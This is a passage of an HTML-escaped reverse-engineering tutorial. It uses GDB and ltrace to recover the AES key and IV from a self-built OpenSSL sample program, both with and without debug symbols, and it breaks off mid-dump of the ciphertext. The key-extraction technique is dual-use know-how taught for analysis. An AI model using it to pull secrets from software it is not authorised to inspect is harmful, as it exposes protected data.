   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a47&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;39&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a4b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a4f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;47&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x34&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a53&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;51&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a57&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a5b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a5e&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7e50660&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EVP_CipherInit_ex@plt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a63&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x28&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a66&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a67&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;ret&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;dump.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can see the arguments loaded from memory to eax and then pushed to the stack (esp is the stack pointer and points to the top of the stack at all times). We are in a Linux 32-bit OS so arguments (or parameters whatever) are pushed to the stack from &lt;a href=&#34;http://duartes.org/gustavo/blog/post/journey-to-the-stack/&#34; target=&#34;_blank&#34;&gt;right to left&lt;/a&gt; (almost the same in 32-bit Windows systems). Here is what it looks like right before the call instruction:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;EVP_DecryptInit_ex arguments&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ctx,&lt;/span&gt;    &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp]&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;type,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ENGINE&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;impl,&lt;/span&gt;           &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt;     &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can print the values of both key and IV. To do this in GDB we need to use this command &lt;code&gt;x/s *((char **) ( $esp+0x10 ))&lt;/code&gt;. The s switch tells GDB to print the result as a string. &lt;code&gt;$esp+0x10&lt;/code&gt; is a pointer that points to a location on the stack. In that location we have a &lt;code&gt;char *&lt;/code&gt; which is another pointer to a string, so we need to dereference it twice (hence the &lt;code&gt;char **&lt;/code&gt;). And finally to print it using the &lt;code&gt;s&lt;/code&gt; switch we need to make it a string (e.g. &lt;code&gt;char *&lt;/code&gt;) so we will use the first *. And it works.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;finding key and IV in gdb with debug info&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(gdb)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;$esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt;	 &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d36a4bf2e6dd9c68&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(gdb)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;$esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt;	 &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/tales1/Queen-Not-Amused.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;h4 id=&#34;2-5-using-gdb-without-debug-info:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.5 Using GDB without Debug Info&lt;/h4&gt;

&lt;p&gt;Our example is in a controlled environment, so we were able to build the binary with debug info. But in a real world scenario we do not have this luxury. In this section I will discuss how to get to  &lt;code&gt;EVP_DecryptInit_ex&lt;/code&gt; without debug info.&lt;/p&gt;

&lt;p&gt;First we have to build our binary without  debug info, just remove the &lt;code&gt;-ggdb&lt;/code&gt; switch to get &lt;code&gt;gcc -o sampleaes-nodebug AES-OpenSSL.c -lcrypto&lt;/code&gt;. Now how do we find the location of &lt;code&gt;EVP_DecryptInit_ex&lt;/code&gt; call?&lt;/p&gt;

&lt;p&gt;Remember the following line in the original ltrace output.
&lt;code&gt;[0x8048b0b] EVP_DecryptInit_ex(0x90bdce0, 0xb7735040, 0, 0x8048d50, 0x8048d71) = 1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We used the &lt;code&gt;i&lt;/code&gt; switch to print the value of instruction pointer after the call. This is our entry point. We will debug the binary in GDB and set up a breakpoint at &lt;code&gt;0x8048b0b&lt;/code&gt; and see what happens.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;running in gdb without debug info 1&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;nodebug&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;q&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;nodebug...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048b0b&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x8048b0b&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;run&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Starting&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;program&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;root&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;Desktop&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;kek&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sampleaes&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;nodebug&lt;/span&gt; 
&lt;span style=&#34;color: #268BD2&#34;&gt;Ciphertext&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f6&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c1&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ae&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;Q4?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;N....mA...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0010&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;de&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;fa&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b9&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: 